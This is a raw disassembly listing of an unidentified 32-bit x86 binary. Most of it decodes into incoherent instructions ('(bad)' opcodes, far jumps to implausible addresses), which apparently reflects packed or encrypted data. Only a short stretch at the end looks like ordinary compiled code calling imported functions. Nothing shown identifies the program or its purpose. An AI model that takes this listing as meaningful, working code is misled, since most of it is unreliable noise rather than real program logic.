  414bb7:	mov    al,BYTE PTR [esi]
  414bb9:	(bad)  
  414bba:	cmp    BYTE PTR [esi-0x34a2fedb],al
  414bc0:	sbb    esi,esp
  414bc2:	sbb    ebp,DWORD PTR [edx+0x62e4272f]
  414bc8:	(bad)  
  414bc9:	xor    eax,0x60bae284
  414bce:	(bad)  
  414bcf:	repz repnz xor eax,0xeb44ccf7
  414bd6:	mul    ah
  414bd8:	aad    0xe0
  414bda:	call   0x21d2:0xee18999f
  414be1:	aad    0xc6
  414be3:	fwait
  414be4:	mov    ah,0x90
  414be6:	mov    bh,0x90
  414be8:	push   0x7715126d
  414bed:	dec    edx
  414bee:	xor    ebx,DWORD PTR [ebp+0x34ffb92d]
  414bf4:	xchg   ecx,eax
  414bf5:	nop
  414bf6:	mov    cl,0xe2
  414bf8:	fs cmp al,0x88
  414bfb:	lock fidivr WORD PTR [esi+0x1e]
  414bff:	(bad)  
  414c00:	fidiv  DWORD PTR [edi-0x21a7a8b0]
  414c06:	sahf   
  414c07:	(bad)  
  414c09:	cmp    eax,0x1bf11b5e
  414c0e:	out    0x1,al
  414c10:	xor    BYTE PTR [eax+0x63],0xee
  414c14:	sbb    esi,eax
  414c16:	add    bl,BYTE PTR [eax]
  414c18:	ja     0x414c0d
  414c1a:	ins    BYTE PTR es:[edi],dx
  414c1b:	loopne 0x414bfc
  414c1d:	test   al,bh
  414c1f:	dec    esi
  414c20:	mov    WORD PTR [ebx-0x2e],fs
  414c23:	test   BYTE PTR [ecx+0x56],bl
  414c26:	jmp    0x81b2b661
  414c2b:	jno    0x414c2a
  414c2d:	mov    eax,ds:0xdb3c8ede
  414c32:	cmp    ah,BYTE PTR [edi+0x6587daa]
  414c38:	das    
  414c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c3a:	loopne 0x414c69
  414c3c:	test   eax,0x79a5799
  414c41:	retf   
  414c42:	pop    edi
  414c43:	sbb    ah,ah
  414c45:	shr    bh,cl
  414c47:	jmp    0xad0e40c0
  414c4c:	push   esp
  414c4d:	ins    DWORD PTR es:[edi],dx
  414c4e:	sbb    DWORD PTR [ebx+esi*8+0x78],esp
  414c52:	test   DWORD PTR [eax-0x7c6fe9a2],ebp
  414c58:	call   0xa1ea1c76
  414c5d:	pop    eax
  414c5e:	mov    edi,0xa82abefa
  414c63:	shl    DWORD PTR [edi-0x7f],0xa4
  414c67:	jae    0x414ce3
  414c69:	mov    dh,BYTE PTR [ebx+0x120bc01b]
  414c6f:	nop
  414c70:	jmp    0x414c2e
  414c72:	(bad)  
  414c73:	xlat   BYTE PTR ds:[ebx]
  414c74:	inc    esp
  414c75:	jg     0x414c33
  414c77:	mov    ebx,0x3d509105
  414c7c:	fwait
  414c7d:	daa    
  414c7e:	jno    0x414c14
  414c80:	xor    bh,al
  414c82:	add    eax,0xa1d55d99
  414c87:	push   eax
  414c88:	add    DWORD PTR [ebx-0x492b8e85],esp
  414c8e:	jmp    0x414c13
  414c90:	mov    eax,ds:0xef8e63d7
  414c95:	ds jnp 0x414c77
  414c98:	rcl    esp,1
  414c9a:	repz dec esi
  414c9c:	or     eax,0x7b7c2c17
  414ca1:	daa    
  414ca2:	inc    edx
  414ca3:	out    dx,eax
  414ca4:	dec    ecx
  414ca5:	pop    ebx
  414ca6:	add    ebx,DWORD PTR [edx+0x2f]
  414ca9:	into   
  414caa:	mov    al,0xf5
  414cac:	mov    ecx,0x1f9aa84b
  414cb1:	cld    
  414cb2:	(bad)  
  414cb3:	mov    ebx,0x63747f51
  414cb8:	adc    ecx,DWORD PTR [edi+0xd]
  414cbb:	mov    ebx,0x45f19587
  414cc0:	cmp    eax,DWORD PTR [edi-0x15f64486]
  414cc6:	jne    0x414d15
  414cc8:	pop    ebx
  414cc9:	icebp  
  414cca:	xor    eax,DWORD PTR [edi]
  414ccc:	fnstcw WORD PTR [ecx-0x44]
  414ccf:	adc    DWORD PTR [eax+0x10683e72],edx
  414cd5:	arpl   WORD PTR [ebp+0x73],cx
  414cd8:	fmul   st,st(2)
  414cda:	jge    0x414c7a
  414cdc:	pop    esp
  414cdd:	jge    0x414cdb
  414cdf:	jo     0x414d58
  414ce1:	sub    BYTE PTR [eax-0x6],bl
  414ce4:	out    dx,eax
  414ce5:	push   esi
  414ce6:	xlat   BYTE PTR ds:[ebx]
  414ce7:	sub    ebx,ebx
  414ce9:	inc    ebp
  414cea:	arpl   WORD PTR [eax+0x2e],bx
  414ced:	test   DWORD PTR [ebp-0x2a153b39],edi
  414cf3:	sbb    al,0x73
  414cf5:	test   BYTE PTR [edi],dl
  414cf7:	pop    edx
  414cf8:	(bad)  
  414cf9:	sub    eax,0x55484905
  414cfe:	sbb    esp,eax
  414d00:	jo     0x414d2b
  414d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d03:	mov    ah,0x75
  414d05:	mov    eax,ds:0x5302ad5e
  414d0a:	leave  
  414d0b:	out    0x98,eax
  414d0d:	cwde   
  414d0e:	or     ch,al
  414d10:	and    DWORD PTR [ecx+eax*1+0x3a],ebp
  414d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d15:	sub    ebp,DWORD PTR [ebx+0x35]
  414d18:	adc    al,0xe8
  414d1a:	loopne 0x414d08
  414d1c:	aad    0x1d
  414d1e:	or     esi,esp
  414d20:	jns    0x414cd2
  414d22:	iret   
  414d23:	mov    dh,0xdb
  414d25:	aas    
  414d26:	mov    esp,0x256d8625
  414d2b:	or     BYTE PTR [ecx-0x68c07bc],bl
  414d31:	adc    esi,esp
  414d33:	push   eax
  414d34:	lods   al,BYTE PTR ds:[esi]
  414d35:	or     dh,BYTE PTR [edx]
  414d37:	adc    edx,ecx
  414d39:	(bad)  
  414d3a:	mov    ah,0x76
  414d3c:	loopne 0x414d59
  414d3e:	adc    cl,dl
  414d40:	inc    ebx
  414d41:	ret    0x90b5
  414d44:	imul   edi,DWORD PTR [ecx-0x1e],0xffffffc0
  414d48:	out    0x8f,eax
  414d4a:	jb     0x414d73
  414d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d4d:	jb     0x414d0b
  414d4f:	sub    bl,BYTE PTR [eax+esi*8+0x58ff3e9d]
  414d56:	mov    bl,0xc3
  414d58:	xor    DWORD PTR [eax],edx
  414d5a:	jmp    0xd2aadd5
  414d5f:	mov    dl,0x59
  414d61:	pop    ebx
  414d62:	clc    
  414d63:	popa   
  414d64:	test   al,0xa5
  414d67:	enter  0xbcd4,0x63
  414d6b:	jl     0x414d3e
  414d6d:	or     DWORD PTR [esi-0x24],esi
  414d70:	test   BYTE PTR [ecx+0x1a],0xf6
  414d74:	popa   
  414d75:	gs and ch,ah
  414d78:	in     al,dx
  414d79:	jno    0x414d30
  414d7b:	jmp    0x700f816d
  414d80:	mov    WORD PTR [ebx+0x282454ba],ds
  414d86:	jge    0x414df1
  414d88:	iret   
  414d89:	or     dl,BYTE PTR [ebx+0x3ae044d]
  414d8f:	mov    ds:0x8fd1b296,eax
  414d94:	add    DWORD PTR [eax],edi
  414d96:	rol    al,1
  414d98:	mov    ds:0x5a5fa9ad,al
  414d9d:	pop    edx
  414d9e:	xor    al,0xf0
  414da0:	lods   eax,DWORD PTR ds:[esi]
  414da1:	push   es
  414da2:	pop    esp
  414da3:	xchg   edi,eax
  414da4:	movsx  ebx,si
  414da7:	mov    edx,0x5f9978a1
  414dac:	xor    BYTE PTR [edx+0x7c5ef4ff],dh
  414db2:	ss pushf 
  414db4:	xor    esi,ecx
  414db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414db7:	adc    BYTE PTR [edi+0x32802016],0x63
  414dbe:	retf   
  414dbf:	cli    
  414dc0:	mov    bh,0x75
  414dc2:	pop    ss
  414dc3:	scas   eax,DWORD PTR es:[edi]
  414dc4:	fs xchg ebp,eax
  414dc6:	pop    ds
  414dc7:	imul   edx,ebx,0x4d
  414dca:	xor    DWORD PTR [ebp+0x7c910b1],ecx
  414dd0:	pop    ebp
  414dd1:	cmp    ebx,DWORD PTR [edx]
  414dd3:	mov    esi,ds
  414dd5:	pop    ss
  414dd6:	cdq    
  414dd7:	in     al,0xbf
  414dd9:	xlat   BYTE PTR ds:[ebx]
  414dda:	mov    dh,0x8c
  414ddc:	(bad)  
  414ddd:	mov    esp,0xa45ff190
  414de2:	xor    cl,BYTE PTR [edi+ebx*2-0x47]
  414de6:	fcomp  QWORD PTR [eax+0x3e]
  414de9:	pop    ds
  414dea:	fmul   QWORD PTR [ebx]
  414dec:	addr16 or al,cl
  414def:	jns    0x414e69
  414df1:	push   edx
  414df2:	dec    eax
  414df3:	jae    0x414e5a
  414df5:	cmp    esp,DWORD PTR [ecx-0x5f]
  414df8:	aad    0x94
  414dfa:	mov    eax,0xe3b3a1d4
  414dff:	fmul   st,st(4)
  414e01:	mulps  xmm3,XMMWORD PTR [ebx+eax*4]
  414e05:	shl    BYTE PTR [esi+0x15],1
  414e08:	add    eax,0x3297a76a
  414e0d:	test   al,0xae
  414e0f:	jmp    0x414e43
  414e11:	inc    esp
  414e12:	aas    
  414e13:	inc    ebp
  414e14:	jns    0x414dca
  414e16:	in     eax,dx
  414e17:	xchg   BYTE PTR ds:0xdcf7a025,ch
  414e1d:	pop    es
  414e1e:	pop    esp
  414e1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e20:	and    al,0x4b
  414e22:	xchg   ebx,eax
  414e23:	in     al,0xe2
  414e25:	xlat   BYTE PTR ds:[ebx]
  414e26:	rol    al,0x76
  414e29:	mov    dh,0x9
  414e2b:	or     ah,BYTE PTR ds:0x294c5ffc
  414e31:	lds    edi,FWORD PTR [edi-0x215ce2f2]
  414e37:	loop   0x414de1
  414e39:	or     esp,DWORD PTR [ecx]
  414e3b:	cmc    
  414e3c:	lahf   
  414e3d:	xchg   ebp,eax
  414e3e:	mov    fs,WORD PTR [eax]
  414e40:	arpl   ax,di
  414e42:	xchg   esp,eax
  414e43:	sub    DWORD PTR ds:0xcca3352a,0x55195a44
  414e4d:	jl     0x414e09
  414e4f:	jp     0x414e7e
  414e51:	pop    es
  414e52:	push   ss
  414e53:	(bad)  
  414e54:	stc    
  414e55:	and    bl,ch
  414e57:	shr    DWORD PTR [ecx+0x6c6a9f2a],cl
  414e5d:	add    al,0xcc
  414e5f:	push   esp
  414e60:	bound  ecx,QWORD PTR [ecx-0x3792f4e7]
  414e66:	or     BYTE PTR [ebp+0x13],ah
  414e69:	sub    eax,0xf56e30ed
  414e6e:	cmp    al,0x9b
  414e70:	mov    dl,BYTE PTR [edi]
  414e72:	pop    edi
  414e73:	enter  0xc7d7,0x68
  414e77:	mov    ebp,0xcf73c6e
  414e7c:	adc    ebp,DWORD PTR [ebx]
  414e7e:	aas    
  414e7f:	(bad)  
  414e80:	fnsave ds:0xa1d93d24
  414e86:	push   edi
  414e87:	sbb    BYTE PTR [edx-0x5],0x6a
  414e8b:	scas   eax,DWORD PTR es:[edi]
  414e8c:	cli    
  414e8d:	test   DWORD PTR [edi-0x38],ebp
  414e90:	stc    
  414e91:	sbb    bl,BYTE PTR [ecx-0xb]
  414e94:	mov    esp,0x1fd98c9f
  414e99:	push   eax
  414e9a:	mov    esi,0x4eaabf7
  414e9f:	pusha  
  414ea0:	xor    DWORD PTR [ebx-0x6fa2d665],ebp
  414ea6:	sbb    ebx,ebp
  414ea8:	retf   0xbab6
  414eab:	(bad)
  414eaf:	out    dx,al
  414eb0:	imul   edx,DWORD PTR [ecx],0x962fa1f2
  414eb6:	add    al,0xc0
  414eb8:	retf   0xfa36
  414ebb:	iret   
  414ebc:	push   0xd2360427
  414ec1:	aaa    
  414ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ec3:	retf   0xf1e0
  414ec6:	lock add al,ah
  414ec9:	(bad)  
  414eca:	sbb    eax,0xab96f34c
  414ecf:	sub    BYTE PTR [ebx+0x3de899c2],bl
  414ed5:	or     eax,DWORD PTR [ebx+0x3084dccc]
  414edb:	push   ss
  414edc:	loop   0x414f54
  414ede:	mov    edx,0x3c8711ae
  414ee3:	scas   al,BYTE PTR es:[edi]
  414ee4:	lods   eax,DWORD PTR ds:[esi]
  414ee5:	test   al,0x6c
  414ee7:	outs   dx,DWORD PTR ds:[esi]
  414ee8:	push   ds
  414ee9:	mov    ebp,0x3a298119
  414eee:	sub    DWORD PTR [esi],esp
  414ef0:	addr16 pop ecx
  414ef2:	les    ebx,FWORD PTR [ecx]
  414ef4:	jnp    0x414ed1
  414ef6:	fsubr  st,st(1)
  414ef8:	arpl   WORD PTR [edx],bx
  414efa:	and    al,0xdd
  414efc:	imul   ecx,esp,0x73d17891
  414f02:	loope  0x414f73
  414f04:	sub    al,0x1a
  414f06:	paddsb mm5,QWORD PTR [ebx]
  414f09:	mov    eax,ds:0x24d7342a
  414f0e:	enter  0x7b42,0x3
  414f12:	loopne 0x414efb
  414f14:	dec    BYTE PTR [ebx+edx*4-0x4f3b25f5]
  414f1b:	mov    eax,0x8e7bff5c
  414f20:	jnp    0x414f72
  414f22:	fstp   TBYTE PTR [esi]
  414f24:	or     esi,edi
  414f26:	hlt    
  414f27:	imul   esi,DWORD PTR [esi+0x4c179469],0x6b
  414f2e:	pop    esp
  414f2f:	pop    es
  414f30:	cwde   
  414f31:	ins    DWORD PTR es:[edi],dx
  414f32:	ret    0x5abc
  414f35:	mov    dh,0x97
  414f37:	hlt    
  414f38:	in     eax,0xb3
  414f3a:	pop    esi
  414f3b:	bound  edi,QWORD PTR [ebx+0x70]
  414f3e:	imul   esi,DWORD PTR [edi+0x4b3bc4d9],0xb5a0d8e7
  414f48:	mov    ch,0xb4
  414f4a:	shl    DWORD PTR [ecx-0x5c],1
  414f4d:	and    eax,0xc9c8a436
  414f52:	lahf   
  414f53:	mov    ah,0xf2
  414f55:	cmp    bh,BYTE PTR [ebx-0x54d40fd5]
  414f5b:	xchg   DWORD PTR [esi-0x47f7ac9a],esp
  414f61:	adc    esi,DWORD PTR [eax]
  414f63:	sub    al,0xe9
  414f65:	fwait
  414f66:	xchg   esp,eax
  414f67:	cmp    DWORD PTR [eax+eiz*2+0x7266bc94],esp
  414f6e:	and    al,0xc6
  414f70:	xchg   edi,eax
  414f71:	push   ebp
  414f72:	add    eax,0x4da954e4
  414f77:	jb     0x414f37
  414f79:	mov    ebp,0x2d3a4b94
  414f7e:	jb     0x414f70
  414f80:	pushf  
  414f81:	mov    al,0x12
  414f83:	xor    al,0xfc
  414f85:	and    al,0xb3
  414f87:	inc    edx
  414f88:	mov    bl,0x58
  414f8a:	dec    edi
  414f8b:	cmp    BYTE PTR [edx+0x78],dl
  414f8e:	imul   edx,edx,0x6bc5fb77
  414f94:	call   0x3a22a672
  414f99:	adc    eax,0x53864471
  414f9e:	jnp    0x414fe6
  414fa0:	sub    BYTE PTR [esi+0x6e],bh
  414fa3:	or     ebp,DWORD PTR [edi-0x5e]
  414fa6:	leave  
  414fa7:	sbb    dh,BYTE PTR [ecx+0x50]
  414faa:	in     al,dx
  414fab:	icebp  
  414fac:	mov    dl,0xf1
  414fae:	and    eax,0xba12a5ae
  414fb3:	test   al,0xde
  414fb5:	std    
  414fb6:	ficomp DWORD PTR [eax]
  414fb8:	(bad)  
  414fb9:	adc    ch,BYTE PTR [esi-0x61434a3d]
  414fbf:	cmp    eax,0xdc1fc790
  414fc4:	cwde   
  414fc5:	int3   
  414fc6:	jecxz  0x414faf
  414fc8:	push   edi
  414fc9:	mov    dh,ch
  414fcb:	bound  eax,QWORD PTR [ebx*1+0x4682ab60]
  414fd2:	mov    ah,0x4f
  414fd4:	xchg   ebx,eax
  414fd5:	xor    DWORD PTR [ecx+eiz*2+0x58],ebx
  414fd9:	pop    ds
  414fda:	jp     0x41504a
  414fdc:	call   0x2f45f962
  414fe1:	adc    al,0x69
  414fe3:	fcmovnu st,st(0)
  414fe5:	shl    DWORD PTR [esi+0x1c],cl
  414fe8:	out    0xc4,eax
  414fea:	xchg   edi,eax
  414feb:	xlat   BYTE PTR ds:[ebx]
  414fec:	loop   0x414fca
  414fee:	mov    esp,0xd425f7bd
  414ff3:	dec    edi
  414ff4:	cmp    ch,BYTE PTR [esi+0x31]
  414ff7:	mov    eax,ds:0x47b529a1
  414ffc:	jnp    0x415026
  414ffe:	or     DWORD PTR [edi+0x3dad1df3],esp
  415004:	in     al,dx
  415005:	idiv   ch
  415007:	leave  
  415008:	push   esp
  415009:	xor    ah,BYTE PTR [ecx]
  41500b:	xor    edi,eax
  41500d:	mov    bl,0xc7
  41500f:	xor    ah,BYTE PTR [ecx]
  415011:	sub    dh,cl
  415013:	xor    DWORD PTR [ecx-0x18883d05],0xcb523c62
  41501d:	test   eax,eax
  41501f:	shl    BYTE PTR [edx+0x52],cl
  415022:	inc    edx
  415023:	mov    al,ds:0x4855c5dc
  415028:	test   esi,ebp
  41502a:	sti    
  41502b:	fwait
  41502c:	mul    BYTE PTR [ebp+0x35bde14f]
  415032:	cmc    
  415033:	push   eax
  415034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415035:	mov    ecx,0x51c7e9e9
  41503a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41503b:	pop    ds
  41503c:	pop    ecx
  41503d:	jmp    0x695dc0db
  415042:	sbb    eax,0xb44b5f34
  415047:	cmp    esp,ecx
  415049:	jmp    0x415014
  41504b:	jo     0x415090
  41504d:	aad    0x30
  41504f:	pop    ebx
  415050:	stos   BYTE PTR es:[edi],al
  415051:	inc    edi
  415052:	xor    al,0x1b
  415054:	xchg   BYTE PTR [ebp+0x77],ah
  415057:	sbb    ah,bl
  415059:	les    eax,FWORD PTR [esi-0x13729076]
  41505f:	scas   al,BYTE PTR es:[edi]
  415060:	aaa    
  415061:	jbe    0x4150c9
  415063:	shl    DWORD PTR [esi-0x60],1
  415066:	cmp    bh,BYTE PTR [ecx+0x7]
  415069:	out    0xb7,al
  41506b:	scas   eax,DWORD PTR es:[edi]
  41506c:	jo     0x415084
  41506e:	sub    edi,DWORD PTR [edx]
  415070:	into   
  415071:	pop    edx
  415072:	mov    ds:0xac1711fa,eax
  415077:	ret    0xed76
  41507a:	or     al,0xed
  41507c:	mov    bl,0xc3
  41507e:	mov    dl,0x35
  415080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415081:	in     al,0x33
  415083:	pop    ds
  415084:	jmp    0x553c:0x5ec462dd
  41508b:	imul   esp,DWORD PTR ds:0xf8eda31,0x86a840f1
  415095:	inc    esi
  415096:	push   edi
  415097:	mov    dl,0x90
  415099:	sub    ch,BYTE PTR [eax]
  41509b:	ds in  al,0xa5
  41509e:	cmp    DWORD PTR [eax],ebx
  4150a0:	xchg   BYTE PTR [esi+0x71],ah
  4150a3:	add    dl,0xcf
  4150a6:	aam    0x77
  4150a8:	fbld   TBYTE PTR [esp+ebx*2-0x4a651e64]
  4150af:	mov    ds:0xbad7a3bf,eax
  4150b4:	addr16 (bad) 
  4150b6:	mov    ebx,0x1f0d9f41
  4150bb:	fdivr  st(2),st
  4150bd:	jp     0x415119
  4150bf:	cmp    eax,0x26bfe190
  4150c4:	and    BYTE PTR [edi],0x3d
  4150c7:	pop    eax
  4150c8:	inc    ecx
  4150c9:	loope  0x4150ef
  4150cb:	mov    eax,ecx
  4150cd:	call   0xbb46:0x955922c
  4150d4:	pusha  
  4150d5:	sub    eax,0x44f018d8
  4150da:	adc    ebp,ecx
  4150dc:	sbb    BYTE PTR [edi-0x1c],ch
  4150df:	jbe    0x41512d
  4150e1:	sahf   
  4150e2:	and    eax,0x30a97ee4
  4150e7:	sbb    DWORD PTR [esi+0x479fb1c6],esi
  4150ed:	cld    
  4150ee:	jge    0x415169
  4150f0:	out    0x53,al
  4150f2:	outs   dx,BYTE PTR ds:[esi]
  4150f3:	not    BYTE PTR [eax+0x2a]
  4150f6:	inc    ebx
  4150f7:	push   0x7f
  4150f9:	xchg   BYTE PTR [edx],bl
  4150fb:	(bad)  
  4150fc:	dec    ebx
  4150fd:	add    BYTE PTR [edx+0x24],dh
  415100:	add    eax,0x7856b461
  415105:	aaa    
  415106:	leave  
  415107:	fs mov cl,0x8a
  41510a:	push   es
  41510b:	(bad)  
  41510d:	sbb    DWORD PTR [eax+0x39],ebx
  415110:	mov    bl,0x17
  415112:	push   es
  415113:	loope  0x4150e8
  415115:	xchg   ecx,eax
  415116:	pop    esp
  415117:	jecxz  0x415186
  415119:	cmc    
  41511a:	mov    WORD PTR [edi-0x2e],?
  41511d:	les    ecx,FWORD PTR [eax+0x58]
  415120:	jns    0x41519a
  415122:	pop    edi
  415123:	(bad)  
  415124:	sub    bl,BYTE PTR [edi+eiz*1]
  415127:	sub    eax,0x151bf848
  41512c:	scas   eax,DWORD PTR es:[edi]
  41512d:	adc    DWORD PTR [ebp+0x40],eax
  415130:	xchg   ebx,eax
  415131:	dec    ebx
  415132:	shr    BYTE PTR [ecx+0x35],cl
  415135:	mov    ebp,0xeba4507
  41513a:	aaa    
  41513b:	sub    al,0xaa
  41513d:	xchg   esi,eax
  41513e:	dec    esi
  41513f:	xchg   BYTE PTR [ecx+ebp*8],al
  415142:	mov    ecx,0x251133c1
  415147:	push   0x3615c38a
  41514c:	mov    al,ds:0x608ac318
  415151:	add    eax,0x11dbff77
  415156:	std    
  415157:	xor    al,0x41
  415159:	push   esp
  41515a:	xchg   esp,eax
  41515b:	lds    ebp,FWORD PTR [ebp-0x67]
  41515e:	in     eax,0xd4
  415160:	data16 jae 0x415146
  415163:	sar    BYTE PTR [ecx+ebx*8-0x6a],cl
  415167:	js     0x415178
  415169:	int3   
  41516a:	mov    ebp,0x244d6773
  41516f:	sbb    DWORD PTR [esi+0x1d],edi
  415172:	xchg   DWORD PTR [ebp+0x2],eax
  415175:	cli    
  415176:	stos   BYTE PTR es:[edi],al
  415177:	outs   dx,DWORD PTR ds:[esi]
  415178:	loopne 0x415196
  41517a:	mov    eax,0x36fe5abb
  41517f:	fisttp QWORD PTR [esp+ecx*2-0x1ae776a8]
  415186:	cmp    al,0x4f
  415188:	lods   al,BYTE PTR ds:[esi]
  415189:	jp     0x415146
  41518b:	sbb    eax,DWORD PTR [ebp-0x7c]
  41518e:	int    0x84
  415190:	mov    edi,0xbdbc71ef
  415195:	int3   
  415196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415197:	imul   ebx,DWORD PTR [ebx+0x4a],0xc829dd6e
  41519e:	mov    ebx,0xcafa6b9
  4151a3:	sub    BYTE PTR ds:0x45f1fac0,ch
  4151a9:	pop    esi
  4151aa:	shl    DWORD PTR [ecx-0x41],0xc8
  4151ae:	adc    eax,edx
  4151b0:	add    ebp,DWORD PTR [eax+0x1cc8da24]
  4151b6:	adc    dh,BYTE PTR [ebx-0x7f6e6b1f]
  4151bc:	lods   eax,DWORD PTR ds:[esi]
  4151bd:	(bad)  
  4151be:	(bad)  
  4151bf:	push   0x52
  4151c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151c2:	jp     0x4151b1
  4151c4:	cmp    BYTE PTR [edx-0x21103c07],ah
  4151ca:	push   esp
  4151cb:	rol    ch,1
  4151cd:	fimul  DWORD PTR es:[ebx+0x14891ffd]
  4151d4:	test   BYTE PTR [edi+0x2a421875],0xc9
  4151db:	mov    ds:0xdbf52873,al
  4151e0:	xchg   esi,eax
  4151e1:	xchg   ebx,eax
  4151e2:	pop    ecx
  4151e3:	and    ah,BYTE PTR [edx]
  4151e5:	sub    al,0x9e
  4151e7:	lds    ecx,FWORD PTR [ebx-0x9]
  4151ea:	lods   eax,DWORD PTR ds:[esi]
  4151eb:	imul   ebx,DWORD PTR [ecx],0xffffffc9
  4151ee:	loop   0x4151d6
  4151f0:	gs mov edi,0xc59806c2
  4151f6:	adc    eax,0xad0fecc6
  4151fb:	mov    ds,WORD PTR [eax+0x440d7517]
  415201:	cmp    eax,0xc54a167
  415206:	and    ebx,edi
  415208:	push   ss
  415209:	sahf   
  41520a:	push   es
  41520b:	pop    edi
  41520c:	cmp    eax,0x8a326965
  415211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415212:	pcmpeqw mm7,mm6
  415215:	mov    DWORD PTR [esi+edx*2+0xf5df0ab],ebx
  41521c:	ins    BYTE PTR es:[edi],dx
  41521d:	stc    
  41521e:	and    BYTE PTR [edx],dl
  415220:	and    esp,ebp
  415222:	clc    
  415223:	or     al,BYTE PTR [ecx+0x12]
  415226:	and    ebx,DWORD PTR [ebx]
  415228:	and    DWORD PTR [edi-0x60],ecx
  41522b:	cmp    esp,ecx
  41522d:	push   esp
  41522e:	xchg   ebp,eax
  41522f:	xor    BYTE PTR [edx+edx*1],bl
  415232:	stos   BYTE PTR es:[edi],al
  415233:	out    dx,al
  415234:	push   edx
  415235:	dec    edx
  415236:	repnz sbb al,0xca
  415239:	(bad)  
  41523a:	sbb    bl,dl
  41523c:	push   edi
  41523d:	push   ds
  41523e:	inc    edi
  41523f:	jns    0x41524f
  415241:	test   DWORD PTR [edi+0x4ed8cb49],ebp
  415247:	adc    ah,BYTE PTR [eax-0x719f361]
  41524d:	xchg   DWORD PTR [ebp*2+0x33a3f40d],ebx
  415254:	add    DWORD PTR [ecx],edx
  415256:	ja     0x4152ba
  415258:	pop    edi
  415259:	ja     0x415266
  41525b:	jge    0x4151e8
  41525d:	sub    WORD PTR [esi+0x63],cx
  415261:	dec    ebx
  415262:	mov    bh,0x2b
  415264:	mov    edx,0x769dbed9
  415269:	lea    edi,[ebp-0x62]
  41526c:	jp     0x41529e
  41526e:	dec    edi
  41526f:	sub    edx,DWORD PTR [ecx-0x4cee6f50]
  415275:	sbb    edx,DWORD PTR [edi-0x4d]
  415278:	add    eax,0xb3d54603
  41527d:	dec    ecx
  41527e:	sti    
  41527f:	imul   esi,DWORD PTR [ecx-0x3efa7b38],0x291abd50
  415289:	pop    esi
  41528a:	and    al,0xa7
  41528c:	out    dx,al
  41528d:	cmp    edx,ecx
  41528f:	adc    DWORD PTR [ebp+0x48223e96],0x2376ac5b
  415299:	popa   
  41529a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41529b:	fs sub bl,al
  41529e:	or     DWORD PTR [ecx],esi
  4152a0:	xchg   esp,eax
  4152a1:	sbb    DWORD PTR [esi+0x69],eax
  4152a4:	call   0x4ea31460
  4152a9:	adc    eax,0xf2dfc544
  4152ae:	test   BYTE PTR [ecx+0x576adfdc],0x7c
  4152b5:	cwde   
  4152b6:	mov    esi,0xb5715ca1
  4152bb:	mov    ebx,0xa260bf1
  4152c0:	sti    
  4152c1:	add    bh,BYTE PTR [esi]
  4152c3:	ret    
  4152c4:	xor    bh,dh
  4152c6:	pusha  
  4152c7:	sahf   
  4152c8:	int3   
  4152c9:	xor    BYTE PTR [ecx+0x49],ah
  4152cc:	mov    BYTE PTR [eax-0x1bb26aa4],al
  4152d2:	xchg   esp,eax
  4152d3:	mov    bh,0xdd
  4152d5:	fimul  WORD PTR [ecx+edi*2+0x592d1782]
  4152dc:	hlt    
  4152dd:	cmp    edx,DWORD PTR [ecx-0xeb92e4]
  4152e3:	adc    DWORD PTR [edx],eax
  4152e5:	inc    edi
  4152e6:	jmp    0x4152ea
  4152e8:	jb     0x4152d8
  4152ea:	xlat   BYTE PTR ds:[ebx]
  4152eb:	mov    esp,0x23d238ba
  4152f0:	jmp    0x428bd3a1
  4152f5:	ja     0x4152c0
  4152f7:	das    
  4152f8:	test   ah,ch
  4152fa:	push   esi
  4152fb:	mov    ds:0x2ec9e6f9,eax
  415300:	in     al,dx
  415301:	sub    edx,DWORD PTR [edi]
  415303:	push   ecx
  415304:	mov    ebp,0xf6f2779d
  415309:	sbb    al,0xcc
  41530b:	or     DWORD PTR [ecx-0x52dbfd26],ebp
  415311:	loope  0x4152a9
  415313:	jge    0x415341
  415315:	ret    
  415316:	mov    esp,0x73f26301
  41531b:	cmp    edx,esp
  41531d:	arpl   bp,si
  41531f:	int3   
  415320:	sbb    al,bl
  415322:	mov    esp,0x53c11973
  415327:	pop    esi
  415328:	test   BYTE PTR [edx+0x5f],cl
  41532b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41532c:	shl    cl,cl
  41532e:	test   eax,0xd0d6d278
  415333:	jb     0x4152e7
  415335:	and    al,0x6f
  415337:	sti    
  415338:	add    DWORD PTR [ecx],eax
  41533a:	popa   
  41533b:	pop    es
  41533c:	sti    
  41533d:	push   es
  41533e:	mov    edi,0x14591aa9
  415343:	lock call 0xd7dfaba7
  415349:	push   edi
  41534a:	call   DWORD PTR ds:0x41702c
  415350:	mov    DWORD PTR [ebp-0x2c],eax
  415353:	movzx  edx,WORD PTR [ebp-0x2c]
  415357:	cmp    edx,0x539
  41535d:	jne    0x41538e
  41535f:	mov    DWORD PTR [ebp-0x14],0xe0d
  415366:	lea    eax,[ebp-0x28]
  415369:	push   eax
  41536a:	call   DWORD PTR ds:0x417030
  415370:	mov    DWORD PTR [ebp-0x60],eax
  415373:	mov    DWORD PTR [ebp-0x54],0x3a
  41537a:	mov    BYTE PTR [ebp-0x34],0x0
  41537e:	mov    DWORD PTR [ebp-0x8],0x85adf9b9
  415385:	mov    DWORD PTR [ebp-0x68],0x10acf7
  41538c:	jmp    0x415395
  41538e:	mov    BYTE PTR ds:0x419f40,0x0
  415395:	push   0x0
  415397:	call   DWORD PTR ds:0x417030
  41539d:	mov    DWORD PTR [ebp-0x2c],eax
  4153a0:	push   DWORD PTR ds:0x417030
  4153a6:	pop    edx
  4153a7:	mov    DWORD PTR [ebp-0x6c],edx
  4153aa:	lea    ecx,[ebp-0x40]
  4153ad:	push   ecx
  4153ae:	mov    edx,DWORD PTR [ebp-0x60]
